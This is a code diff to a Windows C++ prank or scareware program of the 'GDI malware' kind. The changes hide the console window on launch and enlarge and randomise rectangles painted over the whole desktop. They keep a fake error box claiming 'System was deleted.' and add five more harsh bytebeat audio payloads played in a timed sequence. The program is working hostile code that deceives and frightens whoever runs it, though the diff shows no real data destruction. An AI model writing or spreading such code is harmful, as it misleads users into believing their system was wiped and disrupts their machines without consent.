@@ -138,8 +138,8 @@ DWORD WINAPI GDI3(LPCVOID lpparam) {
 		HDC hdc = GetDC(0);
 		int top_x = 0 + x;
 		int top_y = 0 + y;
-		int bottom_x = 100 + x;
-		int bottom_y = 100 + y;
+		int bottom_x = 700 + x;
+		int bottom_y = 700 + y;
 		x += incrementor * SX;
 		y += incrementor * SY;
 		HBRUSH brush = CreateSolidBrush(200);
@@ -214,35 +214,16 @@ DWORD WINAPI GDI6(LPVOID lpparam) {
 	int y = 10;
 	while (1) {
 		HDC hdc = GetDC(0);
-		int top_x = 0 + x;
-		int top_y = 0 + y;
-		int bottom_x = 100 + x;
-		int bottom_y = 100 + y;
+		int top_x = rand () % 500 + x;
+		int top_y = rand () % 500 + y;
+		int bottom_x = rand () % 100 + x;
+		int bottom_y = rand() % 100 + y;
 		x += incrementor * SX;
 		y += incrementor * SY;
 		HBRUSH brush = CreateSolidBrush(200);
 		SelectObject(hdc, brush);
 		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
-		if (y >= GetSystemMetrics(SM_CYSCREEN))
-		{
-			SY = -1;
-		}
-
-		if (x >= GetSystemMetrics(SM_CXSCREEN))
-		{
-			SX = -1;
-		}
-
-		if (y == 0)
-		{
-			SY = rand() % 5;
-		}
-
-		if (x == 0)
-		{
-			SX = rand() % 5;
-		}
-		Sleep(50);
+		Sleep(500);
 		DeleteObject(brush);
 		ReleaseDC(0, hdc);
 	}
@@ -257,7 +238,7 @@ DWORD WINAPI notepad() {
 	return 0;
 }
 
-DWORD WINAPI TEST2(LPVOID lpparam) {
+DWORD WINAPI message(LPVOID lpparam) {
 	MessageBox(NULL, TEXT("System was deleted."), TEXT("ERROR"), MB_OK | MB_ICONERROR);
 	return 0;
 }
@@ -322,10 +303,87 @@ VOID WINAPI S4() {
 	waveOutClose(hWaveOut);
 }
 
+
+VOID WINAPI S5() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * t >> 0 >> (t >> 8));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+
+VOID WINAPI S6() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (t >> 7 | t - 2));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+
+VOID WINAPI S7() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * (t << 3 >> 2 | t >> 7));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+
+VOID WINAPI S8() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(t * ( t + 2 | t >> 7));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+
+VOID WINAPI S9() {
+	HWAVEOUT hWaveOut = 0;
+	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+	char buffer[8000 * 30] = {};
+	for (DWORD t = 0; t < sizeof(buffer); ++t)
+		buffer[t] = static_cast<char>(~t * (2 ^ t << 3 << 2 | t >> 7));
+
+	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+	waveOutClose(hWaveOut);
+}
+
 int main()
 {
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	HANDLE ntpd = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)notepad, 0, 0, 0);
-	HANDLE msg = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)TEST2, 0, 0, 0);
+	HANDLE msg = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)message, 0, 0, 0);
 	Sleep(3000);
 	HANDLE GDIscreen1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GDI1, 0, 0, 0);
 	S1();
@@ -343,5 +401,17 @@ int main()
 	S3();
 	Sleep(30000);
 	S4();
-	Sleep(INFINITE);
+	Sleep(30000);
+	S5();
+	Sleep(30000);
+	S6();
+	Sleep(30000);
+	S7();
+	Sleep(30000);
+	S8();
+	Sleep(30000);
+	S9();
+	Sleep(30000);
+	ExitProcess(0);
+	Sleep(-1);
 }
